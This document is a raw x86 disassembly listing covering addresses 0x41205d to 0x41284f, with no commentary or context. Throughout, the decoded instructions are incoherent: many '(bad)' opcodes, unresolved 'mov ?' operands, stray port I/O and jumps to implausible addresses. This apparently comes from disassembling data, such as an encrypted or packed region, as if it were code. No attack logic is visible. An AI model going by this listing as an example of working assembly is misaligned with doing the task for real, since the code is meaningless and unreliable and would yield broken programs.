  41205d:	mov    ebp,0xeb2afb0b
  412062:	mov    BYTE PTR [edi+0x7dfc0501],dl
  412068:	sbb    BYTE PTR [esi-0x18225fab],ch
  41206e:	mov    BYTE PTR [esi],dl
  412070:	mov    ebp,0xe11538e3
  412075:	jp     0x41207c
  412077:	in     eax,0xa9
  412079:	fild   QWORD PTR [eax+0x30]
  41207c:	in     eax,0x6a
  41207e:	ret    0x166
  412081:	mov    ecx,0xa91845fb
  412086:	(bad)  
  412087:	cmp    eax,0x5e204b5b
  41208c:	fstp   DWORD PTR [edx]
  41208e:	dec    edi
  41208f:	xchg   edi,eax
  412090:	cmp    esp,DWORD PTR fs:[eax]
  412093:	dec    esi
  412094:	fs add bl,al
  412097:	jmp    0x41210e
  412099:	add    al,ch
  41209b:	popa   
  41209c:	(bad)  [edx+0x18600066]
  4120a2:	std    
  4120a3:	jmp    0x28b77882
  4120a8:	dec    ebx
  4120a9:	sbb    al,0x87
  4120ab:	and    eax,0x8756ed42
  4120b0:	and    ah,dh
  4120b2:	mov    dh,0x7a
  4120b4:	fucomi st,st(4)
  4120b6:	ds jmp 0x412094
  4120b9:	in     eax,0xb6
  4120bb:	sahf   
  4120bc:	jmp    0x41209a
  4120be:	aaa    
  4120bf:	jno    0x41208e
  4120c1:	aad    0x88
  4120c3:	cmc    
  4120c4:	mov    dh,ah
  4120c6:	mov    dh,0xe5
  4120c8:	ja     0x4120b0
  4120ca:	mov    dh,0x2b
  4120cc:	bound  esp,QWORD PTR [ecx]
  4120ce:	jg     0x412118
  4120d0:	mov    dh,0xd8
  4120d2:	add    cl,ch
  4120d4:	fcmovnu st,st(4)
  4120d6:	aaa    
  4120d7:	bound  esp,QWORD PTR ds:0x95fb18bd
  4120dd:	mov    esi,0x9c61ac88
  4120e2:	std    
  4120e3:	lods   eax,DWORD PTR ds:[esi]
  4120e4:	gs in  eax,dx
  4120e6:	jae    0x412116
  4120e8:	pop    ss
  4120e9:	popa   
  4120ea:	popf   
  4120eb:	jmp    0x7141fa50
  4120f0:	mov    dh,0x17
  4120f2:	add    cl,ch
  4120f4:	popa   
  4120f5:	mov    dh,0x5b
  4120f7:	xchg   edx,eax
  4120f8:	and    esp,edx
  4120fa:	add    BYTE PTR [edi+0xd7c60a6],dl
  412100:	(bad)  
  412101:	enter  0x64f6,0x0
  412105:	push   ecx
  412106:	mov    ds,WORD PTR [esi]
  412108:	cmp    bh,BYTE PTR [ebp+0x54f524b5]
  41210e:	and    ecx,DWORD PTR [edx+0x32ee3f00]
  412114:	add    al,0x5
  412116:	mov    eax,ds:0x1b180288
  41211b:	aaa    
  41211c:	je     0x41217d
  41211e:	in     eax,0xb
  412120:	inc    esp
  412121:	jmp    0x4120c2
  412123:	dec    ebx
  412124:	jne    0x412117
  412126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412127:	pop    ebx
  412128:	pop    esi
  412129:	leave  
  41212a:	fld    DWORD PTR [eax]
  41212c:	push   ecx
  41212d:	cs mov bl,0x53
  412130:	mov    esp,DWORD PTR [edi-0x3f]
  412133:	adc    al,0x8b
  412135:	mov    ecx,0xc7244494
  41213a:	xchg   edi,eax
  41213b:	in     eax,0x8b
  41213d:	pop    ebx
  41213e:	pusha  
  41213f:	sti    
  412140:	(bad)  
  412142:	push   ebp
  412143:	add    BYTE PTR [eax],al
  412145:	mov    ebx,0xbf244459
  41214a:	imul   eax
  41214c:	push   ebx
  41214d:	mov    eax,ds:0x36db32df
  412152:	cdq    
  412153:	and    al,0x1c
  412155:	add    DWORD PTR [edx-0x5],esp
  412158:	je     0x4120db
  41215a:	xchg   esp,eax
  41215b:	add    al,0x29
  41215d:	hlt    
  41215e:	or     BYTE PTR [edi-0xc88578],bh
  412164:	lds    edi,FWORD PTR [edx-0x26]
  412167:	cmp    eax,0x37de004a
  41216c:	or     esi,DWORD PTR [esi+0xf18bed7]
  412172:	sub    eax,0xf01924b1
  412177:	sbb    edi,DWORD PTR [ebp-0x22a0b618]
  41217d:	add    eax,ecx
  41217f:	inc    ebp
  412180:	test   al,0x9c
  412182:	jnp    0x412161
  412184:	mov    ebp,0xc2973fe1
  412189:	shl    DWORD PTR [edx+0x18],0x5
  41218d:	or     DWORD PTR [ebx],esp
  41218f:	jp     0x4121ce
  412191:	and    al,0x48
  412193:	mov    bl,BYTE PTR [ecx+0x4bfc6a8]
  412199:	and    DWORD PTR [edi],0x63f98103
  41219f:	into   
  4121a0:	sbb    cl,BYTE PTR ds:0xe28640d4
  4121a6:	push   ebp
  4121a7:	inc    ecx
  4121a8:	jecxz  0x4121ac
  4121aa:	and    ebx,DWORD PTR [eax+0x7]
  4121ad:	or     DWORD PTR [eax],esp
  4121af:	jp     0x412142
  4121b1:	test   al,0xce
  4121b3:	mov    edi,0xd260e904
  4121b8:	xor    BYTE PTR [eax+0xe7701d9],al
  4121be:	gs into 
  4121c0:	les    eax,FWORD PTR [ecx-0x7781413e]
  4121c6:	cli    
  4121c7:	xchg   ebx,eax
  4121c8:	inc    ecx
  4121c9:	add    cl,cl
  4121cb:	add    DWORD PTR [ebx+edi*1+0x2523e200],esi
  4121d2:	sbb    al,0x62
  4121d4:	push   esp
  4121d5:	and    DWORD PTR ds:0x8767beec,ecx
  4121db:	push   DWORD PTR fs:[esi+0x4778fcc3]
  4121e2:	add    bl,BYTE PTR [ebp-0x4a]
  4121e5:	ret    
  4121e6:	data16 fstp TBYTE PTR ds:0xc0b40d05
  4121ed:	xchg   DWORD PTR [si],ebx
  4121f0:	inc    BYTE PTR [ebp-0x14a53a]
  4121f6:	xchg   DWORD PTR [eax+ecx*4],esp
  4121f9:	pop    edi
  4121fa:	jmp    ebp
  4121fc:	je     0x412201
  4121fe:	mov    BYTE PTR [edi+edi*8-0x2699397b],ah
  412205:	ins    BYTE PTR es:[edi],dx
  412206:	icebp  
  412207:	push   edi
  412208:	pop    esi
  412209:	and    esi,ecx
  41220b:	aas    
  41220c:	adc    eax,0xe97e4862
  412211:	xor    bl,BYTE PTR ds:0xca72b532
  412217:	test   BYTE PTR [esi-0x269539e0],dh
  41221d:	push   0xffffffe0
  41221f:	data16 test al,0x62
  412222:	push   eax
  412223:	inc    esi
  412224:	in     eax,dx
  412225:	cmp    eax,0xbdd8f57d
  41222a:	pop    ecx
  41222b:	in     eax,0xad
  41222d:	retf   
  41222e:	pop    ss
  41222f:	jmp    0x412240
  412231:	shl    ah,cl
  412233:	add    BYTE PTR [edi+0x58],bl
  412236:	inc    eax
  412237:	add    al,0x62
  412239:	fst    DWORD PTR [esi*1+0x2d99c8c9]
  412240:	ror    DWORD PTR [eax+0x5da53616],cl
  412246:	xor    BYTE PTR [edi+0x1e],dh
  412249:	pop    ecx
  41224a:	(bad)  [edi]
  41224c:	xchg   cl,bl
  41224e:	popa   
  41224f:	add    ch,BYTE PTR [esi]
  412251:	fisubr WORD PTR [edx-0x36]
  412254:	pusha  
  412255:	add    al,ch
  412257:	dec    ecx
  412258:	fstp   DWORD PTR [edx-0x73d0cfec]
  41225e:	loop   0x412260
  412260:	int3   
  412261:	sbb    ah,BYTE PTR [ecx+0x7c]
  412264:	inc    ecx
  412265:	jne    0x41220e
  412267:	add    edi,DWORD PTR [ebx-0x29]
  41226a:	fnstcw WORD PTR [edx+0x169b22e6]
  412270:	jecxz  0x4122ef
  412272:	ret    
  412273:	pop    ss
  412274:	bound  esp,QWORD PTR [esi-0x58]
  412277:	les    edx,FWORD PTR [edi+0x4b]
  41227a:	daa    
  41227b:	test   BYTE PTR [ebp-0x43],dl
  41227e:	add    dh,ah
  412280:	popf   
  412281:	popf   
  412282:	and    al,0xd5
  412284:	iret   
  412285:	and    DWORD PTR [ecx],edi
  412287:	fcmove st,st(7)
  412289:	push   ebp
  41228a:	test   BYTE PTR [eax-0x28bc214b],dh
  412290:	clc    
  412291:	pusha  
  412292:	dec    esp
  412293:	cmc    
  412294:	push   ecx
  412295:	xchg   edi,eax
  412296:	add    ebx,0xa3955d00
  41229c:	fs cmp al,0x8d
  41229f:	dec    eax
  4122a0:	arpl   WORD PTR [ebp-0x43],dx
  4122a3:	adc    BYTE PTR [ebx-0x5b],ah
  4122a6:	mov    ebp,0xbdad730f
  4122ab:	adc    ch,BYTE PTR [ecx-0x7e3f2900]
  4122b1:	pop    ebp
  4122b2:	(bad)  
  4122b4:	arpl   WORD PTR [ebp+0x25710fbd],sp
  4122ba:	mov    ebp,0x191f7320
  4122bf:	out    0xeb,eax
  4122c1:	mov    eax,ds:0x9e303f8
  4122c6:	sbb    edx,esp
  4122c8:	out    dx,eax
  4122c9:	(bad)  
  4122ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122cb:	and    al,0xfa
  4122cd:	cmp    DWORD PTR [ebp+0x1c6f0824],esp
  4122d3:	dec    ebx
  4122d4:	popa   
  4122d5:	adc    eax,0x846c22bd
  4122da:	xchg   edx,eax
  4122db:	or     al,0x73
  4122dd:	and    eax,0x6a6120e5
  4122e2:	sahf   
  4122e3:	aas    
  4122e4:	repnz int3 
  4122e6:	xchg   esp,eax
  4122e7:	hlt    
  4122e8:	loop   0x412278
  4122ea:	in     eax,0x82
  4122ec:	lods   al,BYTE PTR ds:[esi]
  4122ed:	jb     0x412304
  4122ef:	std    
  4122f0:	bound  ecx,QWORD PTR ds:0x4eac18bd
  4122f6:	jns    0x5eea56fc
  4122fc:	pop    ebx
  4122fd:	add    al,cl
  4122ff:	sbb    cl,BYTE PTR [edx+eax*8]
  412302:	inc    ebx
  412303:	xlat   BYTE PTR ds:[ebx]
  412304:	mov    al,BYTE PTR [ecx]
  412306:	ret    
  412307:	fadd   QWORD PTR [edi+0x7fe15744]
  41230d:	clc    
  41230e:	dec    edx
  41230f:	lea    edx,[esi]
  412311:	push   esi
  412312:	mov    esi,0x12afd87
  412317:	pop    ecx
  412318:	push   eax
  412319:	push   DWORD PTR [ecx+0x45322de1]
  41231f:	add    cl,BYTE PTR [eax+0x71cf4506]
  412325:	hlt    
  412326:	pop    ebp
  412327:	pop    ss
  412328:	add    al,0x0
  41232a:	inc    ebp
  41232b:	mov    ?,edx
  41232d:	push   edi
  41232e:	jo     0x4122b9
  412330:	and    al,0xc
  412332:	adc    BYTE PTR [ebp+0x74],dl
  412335:	or     al,0x34
  412337:	lods   al,BYTE PTR ds:[esi]
  412338:	push   esi
  412339:	inc    DWORD PTR [esi]
  41233b:	mov    ds:0x57cb4016,eax
  412340:	les    ecx,FWORD PTR [esi+edi*1]
  412343:	sar    bl,cl
  412345:	test   DWORD PTR [edx],eax
  412347:	xchg   edx,eax
  412348:	or     cl,BYTE PTR [edx+0x30fbcdf7]
  41234e:	(bad)  
  41234f:	int    0x45
  412351:	jne    0x412368
  412353:	mov    ds:0xd6c7c25e,al
  412358:	jg     0x412346
  41235a:	scas   eax,DWORD PTR es:[edi]
  41235b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41235c:	push   ecx
  41235d:	push   esi
  41235e:	adc    BYTE PTR [ecx-0x67ffe3dc],dl
  412364:	pop    ds
  412365:	test   DWORD PTR [edi+eiz*2-0xf],edx
  412369:	test   DWORD PTR [edi+edx*4-0x1a],ecx
  41236d:	push   ebx
  41236e:	mov    dh,BYTE PTR [eax]
  412370:	jnp    0x4122f7
  412372:	sahf   
  412373:	bound  eax,QWORD PTR [eax]
  412375:	add    al,0x0
  412377:	bound  esi,QWORD PTR [edi-0x3f]
  41237a:	mov    DWORD PTR [ebp+ebx*4+0x5dff04],ecx
  412381:	jns    0x412385
  412383:	mov    ds:0x2739633e,al
  412388:	mov    ?,esi
  41238a:	mov    DWORD PTR [esi+eax*4+0x16],eax
  41238e:	mov    DWORD PTR [esi-0x13f2e724],esi
  412394:	ds ja  0x41239b
  412397:	jb     0x412410
  412399:	jne    0x4123bf
  41239b:	cmp    dh,0xbe
  41239e:	add    ch,BYTE PTR [edx]
  4123a0:	mov    BYTE PTR ds:0xb2fb7124,bh
  4123a6:	(bad)  
  4123a7:	or     al,0x3f
  4123a9:	ja     0x4123af
  4123ab:	push   ebx
  4123ac:	mov    BYTE PTR [esi],al
  4123ae:	mov    BYTE PTR [esi+0x31],dl
  4123b1:	(bad)  
  4123b2:	mov    ch,0x21
  4123b4:	das    
  4123b5:	iret   
  4123b6:	cmp    DWORD PTR [esi-0x53f2f6e4],esp
  4123bc:	inc    esi
  4123bd:	inc    BYTE PTR [ebx-0x58]
  4123c0:	mov    edx,0xbbe8d77a
  4123c5:	sub    BYTE PTR [ecx],dl
  4123c7:	add    BYTE PTR [edi],bl
  4123c9:	or     eax,0x1d245dbf
  4123ce:	dec    edx
  4123cf:	and    DWORD PTR [esi+0x6204bf03],0xadfeff18
  4123d9:	(bad)  
  4123da:	in     eax,dx
  4123db:	je     0x41245b
  4123dd:	or     BYTE PTR [eax-0x118f99c1],al
  4123e3:	adc    esi,DWORD PTR [esi]
  4123e5:	xor    al,BYTE PTR [ecx+0x0]
  4123e8:	loope  0x4123a5
  4123ea:	std    
  4123eb:	rcr    DWORD PTR [esi-0x27],0xe7
  4123ef:	pop    ebx
  4123f0:	pusha  
  4123f1:	fsub   st,st(7)
  4123f3:	add    ebp,ecx
  4123f5:	xchg   edi,eax
  4123f6:	jmp    0x41244b
  4123f8:	outs   dx,DWORD PTR ds:[esi]
  4123f9:	mov    ebx,es
  4123fb:	jmp    DWORD PTR [esi-0x15]
  4123fe:	mov    ds:0x6ad9a215,eax
  412403:	(bad)  
  412404:	sbb    bp,bx
  412407:	add    ebx,ebx
  412409:	fisubr DWORD PTR [edx-0x25]
  41240c:	bound  eax,QWORD PTR [ebp-0x454ec406]
  412412:	jb     0x41245c
  412414:	jle    0x4123eb
  412416:	pusha  
  412417:	inc    ebx
  412418:	and    bp,WORD PTR fs:[eax]
  41241c:	pop    edx
  41241d:	bound  ebp,QWORD PTR [eax]
  41241f:	cld    
  412420:	or     ch,bl
  412422:	jb     0x41247c
  412424:	ds loope 0x41248b
  412427:	inc    ebx
  412428:	sbb    bp,WORD PTR fs:[eax]
  41242c:	add    BYTE PTR [esi-0x57],bl
  41242f:	(bad)  
  412430:	sbb    edi,edi
  412432:	adc    BYTE PTR [esi+0x3cd96ac2],bl
  412438:	jns    0x412438
  41243a:	fs call 0xfc1b1ec0
  412440:	xor    ebp,DWORD PTR [edx]
  412442:	test   edi,ebx
  412444:	or     dl,0xdc
  412447:	sti    
  412448:	pop    es
  412449:	nop
  41244a:	sbb    DWORD PTR [edx-0x106124cb],eax
  412450:	in     al,dx
  412451:	xor    ebp,ebx
  412453:	jb     0x412428
  412455:	retf   0x5540
  412458:	in     eax,dx
  412459:	scas   eax,DWORD PTR es:[edi]
  41245a:	add    al,0x5
  41245c:	in     eax,dx
  41245d:	xor    eax,0x667346e1
  412462:	lods   al,BYTE PTR fs:[esi]
  412464:	sti    
  412465:	xchg   esi,eax
  412466:	xchg   BYTE PTR [eax],al
  412468:	in     eax,0xa
  41246a:	and    al,ch
  41246c:	dec    ebp
  41246d:	xchg   edx,eax
  41246e:	push   cs
  41246f:	std    
  412470:	adc    dl,BYTE PTR [ecx+0x64]
  412473:	aas    
  412474:	in     eax,0xfa
  412476:	mov    ds:0x8c7eb908,eax
  41247b:	or     al,0x62
  41247d:	xchg   ecx,eax
  41247e:	add    DWORD PTR [eax],ebx
  412480:	add    eax,0xe8b00e4f
  412485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412486:	sbb    ecx,DWORD PTR [eax]
  412488:	jmp    0x982d8741
  41248d:	retf   0xc8c
  412490:	jb     0x412492
  412492:	adc    BYTE PTR [esi+esi*8+0x54],bl
  412496:	push   0xffffffca
  412498:	rol    dl,0x9e
  41249b:	bound  eax,QWORD PTR [edx]
  41249d:	sbb    ch,cl
  41249f:	sar    DWORD PTR [edi+0x74a1a33d],0xd
  4124a6:	push   esi
  4124a7:	test   DWORD PTR ds:0x48e08a21,edx
  4124ad:	xor    al,0x49
  4124af:	bound  edx,QWORD PTR [ebx-0x7]
  4124b2:	jp     0x412458
  4124b4:	or     BYTE PTR [edi],dh
  4124b6:	push   ss
  4124b7:	test   eax,0x1fe96fe
  4124bc:	aaa    
  4124bd:	cmp    BYTE PTR [ebx],cl
  4124bf:	fld    TBYTE PTR [edx-0x18]
  4124c2:	pop    edx
  4124c3:	lods   al,BYTE PTR ds:[esi]
  4124c4:	adc    BYTE PTR [edx-0x6c],dh
  4124c7:	loope  0x41251f
  4124c9:	sub    DWORD PTR [edi],0x4a6efd0d
  4124cf:	and    ecx,ebp
  4124d1:	bswap  edi
  4124d3:	mov    cl,BYTE PTR [eax]
  4124d5:	jb     0x41254b
  4124d7:	loope  0x4124d6
  4124d9:	(bad)  [ebp+0x62]
  4124dc:	push   ebx
  4124dd:	stc    
  4124de:	smsw   WORD PTR [edi]
  4124e1:	add    BYTE PTR [edi],ah
  4124e3:	std    
  4124e4:	cli    
  4124e5:	jmp    0x4124a2
  4124e7:	nop
  4124e8:	dec    ecx
  4124e9:	or     BYTE PTR [esi],al
  4124eb:	call   0x5650:0xebee8b04
  4124f2:	push   ebx
  4124f3:	ss idiv edi
  4124f6:	add    BYTE PTR [ecx+edx*4-0x32],dl
  4124fa:	mov    edi,DWORD PTR [edx]
  4124fc:	sahf   
  4124fd:	pop    ecx
  4124fe:	ret    0xdb87
  412501:	dec    edi
  412502:	mov    eax,DWORD PTR [edx-0x13fc785c]
  412508:	xchg   ecx,eax
  412509:	jl     0x41252f
  41250b:	das    
  41250c:	rol    DWORD PTR [edi+0x148703cf],cl
  412512:	dec    eax
  412513:	sahf   
  412514:	mov    ch,0x6a
  412516:	add    ebx,DWORD PTR [eax+0x27]
  412519:	push   ebp
  41251a:	lea    edi,[edi+edx*8-0xd]
  41251e:	icebp  
  41251f:	ror    BYTE PTR [ebp-0x43],0xe1
  412523:	or     DWORD PTR [eax],esi
  412525:	or     ebp,DWORD PTR [edx+0x8]
  412528:	enter  0x59d2,0x86
  41252c:	call   0xc1c8:0x8ecaf702
  412533:	jmp    0xd4:0xcf8de8d6
  41253a:	mov    ecx,ebx
  41253c:	pop    eax
  41253d:	div    BYTE PTR [esp+esi*8-0x58]
  412541:	push   ebx
  412542:	(bad)  
  412543:	fucomip st,st(6)
  412545:	sbb    BYTE PTR [ebx-0xc4d1f0],cl
  41254b:	push   esp
  41254c:	add    al,BYTE PTR [ecx-0x77ef3040]
  412552:	dec    esp
  412553:	outs   dx,DWORD PTR ds:[esi]
  412554:	fld    QWORD PTR [ecx-0x7a2b7037]
  41255a:	add    DWORD PTR [eax],eax
  41255c:	bound  edi,QWORD PTR [ebx-0x3e]
  41255f:	jmp    0xe8fba0bf
  412564:	sbb    cl,ah
  412566:	add    eax,DWORD PTR [eax]
  412568:	push   ecx
  412569:	ror    BYTE PTR [ecx+0x5e],0x29
  41256d:	ret    0xfff8
  412570:	cs jnp 0x41254b
  412573:	mov    DWORD PTR [ebx-0x7d],esp
  412576:	fadd   QWORD PTR [eax]
  412578:	out    dx,al
  412579:	das    
  41257a:	cmp    DWORD PTR [edx+ecx*2-0x7d],esi
  41257e:	fadd   QWORD PTR [ecx]
  412580:	out    dx,al
  412581:	repz xor al,al
  412584:	dec    ecx
  412585:	dec    edi
  412586:	jle    0x4125d3
  412588:	push   0xf
  41258a:	jo     0x412598
  41258c:	f2xm1  
  41258e:	fsub   QWORD PTR [edx-0x161600b9]
  412594:	test   bh,dh
  412596:	jae    0x4125a0
  412598:	xor    eax,0x9f8900b1
  41259d:	clc    
  41259e:	jmp    0xd4bc7c16
  4125a3:	call   0xfe2b4133
  4125a8:	or     DWORD PTR [ecx],esi
  4125aa:	js     0x4125eb
  4125ac:	data16 jnp 0x4125e7
  4125af:	or     BYTE PTR [edx-0x16f38fc1],dh
  4125b5:	push   eax
  4125b6:	(bad)  
  4125b8:	clc    
  4125b9:	outs   dx,BYTE PTR ds:[esi]
  4125ba:	jmp    0x8:0xc6c563b0
  4125c1:	(bad)  
  4125c2:	lds    edi,FWORD PTR [ebp-0x14]
  4125c5:	xor    al,0x8b
  4125c7:	jo     0x4125d5
  4125c9:	jmp    0x5837a63e
  4125ce:	cld    
  4125cf:	xor    eax,0x7ddeb9c0
  4125d4:	add    dh,BYTE PTR [ecx-0x27]
  4125d7:	xor    BYTE PTR [esi],bl
  4125d9:	cmc    
  4125da:	test   BYTE PTR [edx-0x6042c9c5],ch
  4125e0:	outs   dx,DWORD PTR ds:[esi]
  4125e1:	dec    edi
  4125e2:	mov    eax,ds:0x842a14d3
  4125e7:	mov    al,0x7e
  4125e9:	xor    ecx,ebp
  4125eb:	jb     0x412625
  4125ed:	pop    edx
  4125ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125ef:	aas    
  4125f0:	inc    esi
  4125f1:	mov    DWORD PTR ds:0xa835de2e,ecx
  4125f7:	adc    al,BYTE PTR ds:0x5072d808
  4125fd:	push   edx
  4125fe:	bound  esp,QWORD PTR [ebx+edi*8-0x1840fef1]
  412605:	pop    edi
  412606:	or     eax,0xb44bbb72
  41260b:	(bad)  
  41260c:	je     0x412668
  41260e:	pusha  
  41260f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412610:	sti    
  412611:	inc    esi
  412612:	mov    bl,ah
  412614:	jle    0x4125a7
  412616:	jmp    0x106e0258
  41261b:	fsubp  st(1),st
  41261d:	cmp    ebp,edx
  41261f:	bound  esi,QWORD PTR [edi]
  412621:	pop    edx
  412622:	pop    esi
  412623:	sub    DWORD PTR [eax],eax
  412625:	add    bl,ch
  412627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412628:	xlat   BYTE PTR ds:[ebx]
  412629:	push   ebx
  41262a:	lods   al,BYTE PTR ds:[esi]
  41262b:	add    DWORD PTR [edx],edi
  41262d:	out    dx,al
  41262e:	prefetch BYTE PTR [edx-0x46]
  412632:	fistp  DWORD PTR [edx]
  412634:	or     eax,0xe7de2047
  412639:	dec    esi
  41263a:	jmp    0x412639
  41263c:	xor    al,0x51
  41263e:	fist   DWORD PTR [edx]
  412640:	bound  esi,QWORD PTR [edi]
  412642:	push   esi
  412643:	pusha  
  412644:	out    0x3b,al
  412646:	sub    al,BYTE PTR [esi+0x1bdd2e9]
  41264c:	sti    
  41264d:	hlt    
  41264e:	int    0xc
  412650:	add    BYTE PTR [edx-0x32],ah
  412653:	pop    eax
  412654:	div    ch
  412656:	push   0xffffffa3
  412658:	std    
  412659:	fsubr  QWORD PTR [ebp+0x3d5ecd61]
  41265f:	loope  0x412649
  412661:	leave  
  412662:	mov    edx,0xa664fd0e
  412667:	test   DWORD PTR [ebx],ecx
  412669:	jb     0x4126b8
  41266b:	jmp    0xd75356f3
  412670:	xchg   eax,ebp
  412672:	push   es
  412673:	adc    ebp,ecx
  412675:	loopne 0x412675
  412677:	sbb    ch,al
  412679:	mov    gs,WORD PTR [esi+0xc]
  41267c:	std    
  41267d:	fisub  DWORD PTR [ecx-0x604ba152]
  412683:	fld    QWORD PTR [eax]
  412685:	mov    ah,0xde
  412687:	std    
  412688:	jle    0x41269f
  41268a:	add    BYTE PTR [edx-0x29],ah
  41268d:	add    cl,ch
  41268f:	aam    0x58
  412691:	cld    
  412692:	hlt    
  412693:	cmp    cl,BYTE PTR [esi]
  412695:	push   ecx
  412696:	xchg   edi,eax
  412697:	xchg   edx,eax
  412698:	cmp    edi,0x50d961e7
  41269e:	cmp    BYTE PTR [ebx],bh
  4126a0:	call   0xd9e322ad
  4126a5:	mov    DWORD PTR [ecx+0x107e329c],esi
  4126ab:	dec    edi
  4126ac:	add    ecx,DWORD PTR [ecx-0x53ba0541]
  4126b2:	push   ds
  4126b3:	sahf   
  4126b4:	(bad)  [ecx+0x40a5d956]
  4126ba:	jmp    0x9dcc874d
  4126bf:	add    al,0xe
  4126c1:	std    
  4126c2:	or     DWORD PTR [edx-0x65],0x195ce902
  4126c9:	je     0x4126cb
  4126cb:	mov    ebx,0x850cc354
  4126d0:	push   esi
  4126d1:	sti    
  4126d2:	dec    eax
  4126d3:	leave  
  4126d4:	sbb    al,0x2f
  4126d6:	shr    BYTE PTR [edi+ebx*4+0x57],0xc9
  4126db:	mov    BYTE PTR [ebp-0x735af30a],ch
  4126e1:	xchg   BYTE PTR [eax-0x14ff681c],dh
  4126e7:	pop    esp
  4126e8:	push   edi
  4126e9:	in     al,dx
  4126ea:	ins    BYTE PTR es:[edi],dx
  4126eb:	xchg   ebx,eax
  4126ec:	xlat   BYTE PTR ds:[ebx]
  4126ed:	add    BYTE PTR [ebx+0x0],dl
  4126f0:	imul   BYTE PTR [ecx-0x290097ad]
  4126f6:	add    BYTE PTR [eax],al
  4126f8:	js     0x412716
  4126fa:	xchg   ecx,edi
  4126fc:	mov    eax,0xa75488a8
  412701:	loopne 0x4126fe
  412703:	adc    eax,0x40e9d7
  412708:	enter  0xc4a,0xff
  41270c:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41270e:	adc    al,BYTE PTR [eax+0x3b]
  412711:	nop
  412712:	inc    ebx
  412713:	add    al,0xb8
  412715:	(bad)  
  412716:	cli    
  412717:	jne    0x41275d
  412719:	(bad)
  41271c:	jb     0x4126f5
  41271e:	add    BYTE PTR [eax],al
  412720:	push   0x2f245490
  412725:	ds or  eax,0xe8598399
  41272b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41272c:	aas    
  41272d:	aam    0x0
  41272f:	lea    eax,[edi-0x47]
  412732:	sbb    BYTE PTR [eax-0x34],dl
  412735:	call   0xd58c3cba
  41273a:	test   DWORD PTR [edi-0xd],eax
  41273d:	pop    ecx
  41273e:	shl    BYTE PTR [ebx+eiz*1-0x39],0xc0
  412743:	inc    eax
  412744:	(bad)  
  412745:	shl    BYTE PTR [edi+0x54],1
  412748:	xchg   ah,bh
  41274a:	stos   DWORD PTR es:[edi],eax
  41274b:	adc    bh,bl
  41274d:	mov    BYTE PTR [eax+0x3ece3e8],al
  412753:	add    BYTE PTR [eax],al
  412755:	xlat   BYTE PTR ds:[ebx]
  412756:	mov    esp,0xef121820
  41275b:	pop    edx
  41275c:	push   esi
  41275e:	inc    esp
  41275f:	push   ebp
  412760:	inc    esp
  412761:	bound  eax,QWORD PTR [ebp-0x1a]
  412764:	adc    esp,DWORD PTR [edx-0x14ffbef2]
  41276a:	xor    esi,ebp
  41276c:	and    BYTE PTR [edx+0x636a9a4c],0x7d
  412773:	push   eax
  412774:	and    al,0x66
  412776:	mov    DWORD PTR [edx],esp
  412778:	sub    dl,bh
  41277a:	daa    
  41277b:	fst    DWORD PTR [esi+0x16]
  41277e:	add    DWORD PTR [ecx],eax
  412780:	mov    esp,DWORD PTR [esi]
  412782:	adc    al,0x9
  412784:	push   eax
  412785:	adc    DWORD PTR [ebp-0x1a],ecx
  412788:	adc    eax,DWORD PTR [esi]
  41278a:	push   cs
  41278b:	inc    ecx
  41278c:	add    bl,ch
  41278e:	cmp    cl,BYTE PTR ds:0x7e842283
  412794:	push   0x63
  412796:	jne    0x4127e8
  412798:	and    al,0x5e
  41279a:	leave  
  41279b:	and    ah,BYTE PTR [edx+0x32d958ba]
  4127a1:	mov    es,WORD PTR [ecx]
  4127a3:	add    DWORD PTR [ebx+0x500cdc9e],ecx
  4127a9:	mov    bl,al
  4127ab:	xchg   ebx,eax
  4127ac:	shl    BYTE PTR [ecx-0x11],1
  4127af:	pop    edx
  4127b0:	add    al,0xb7
  4127b2:	out    dx,eax
  4127b3:	in     eax,0x13
  4127b5:	(bad)  
  4127b6:	sub    eax,0xeb000041
  4127bb:	bnd jg 0x41277e
  4127be:	fldcw  WORD PTR gs:[ebx+0x4b]
  4127c2:	out    dx,eax
  4127c3:	or     DWORD PTR [esi+0x1a69352],ebx
  4127c9:	add    dh,BYTE PTR [edx]
  4127cb:	or     dh,ah
  4127cd:	fwait
  4127ce:	jo     0x412769
  4127d0:	out    0x80,eax
  4127d2:	mov    ds:0xc73f63d9,al
  4127d7:	or     DWORD PTR [esi+0x7c],esi
  4127da:	daa    
  4127db:	jmp    0x9f643c4
  4127e0:	out    0x59,eax
  4127e2:	bound  esp,QWORD PTR [eax-0x5a]
  4127e5:	or     esp,DWORD PTR [edi+0x220f47e3]
  4127eb:	fldenv [edx-0x25]
  4127ee:	loope  0x4127eb
  4127f0:	cmc    
  4127f1:	jg     0x412804
  4127f3:	fsub   st,st(7)
  4127f5:	add    ebx,ebx
  4127f7:	ret    
  4127f8:	sbb    edx,DWORD PTR [ebx]
  4127fa:	and    bl,cl
  4127fc:	or     BYTE PTR [edi+0x3e],al
  4127ff:	mov    eax,0xe0f81bc6
  412804:	mov    ah,0xe6
  412806:	mov    WORD PTR [edi-0x52],ds
  412809:	pop    ss
  41280a:	enter  0xb4d3,0xe6
  41280e:	sub    al,0x53
  412810:	scas   al,BYTE PTR es:[edi]
  412811:	xor    esi,DWORD PTR [edx-0x4ee889f8]
  412817:	or     ah,bl
  412819:	fist   WORD PTR [edx-0x67]
  41281c:	out    0x80,eax
  41281e:	add    BYTE PTR [edx],ah
  412820:	mov    ?,ebp
  412822:	push   ebx
  412823:	mov    eax,0xd90451d9
  412828:	mov    al,ds:0xade95407
  41282d:	add    esp,DWORD PTR [eax]
  41282f:	jmp    0x412847
  412831:	iret   
  412832:	stos   DWORD PTR es:[edi],eax
  412833:	es (bad) 
  412836:	fsub   DWORD PTR [eax-0x34]
  412839:	add    BYTE PTR [ecx-0x22d4ad53],ch
  41283f:	fs cdq 
  412841:	add    BYTE PTR [ebx],dl
  412843:	pushaw 
  412845:	inc    ebp
  412846:	std    
  412847:	(bad)  
  412848:	sub    al,0x37
  41284a:	ss push 0xffffffd6
  41284d:	test   dl,dh
  41284f:	pusha  
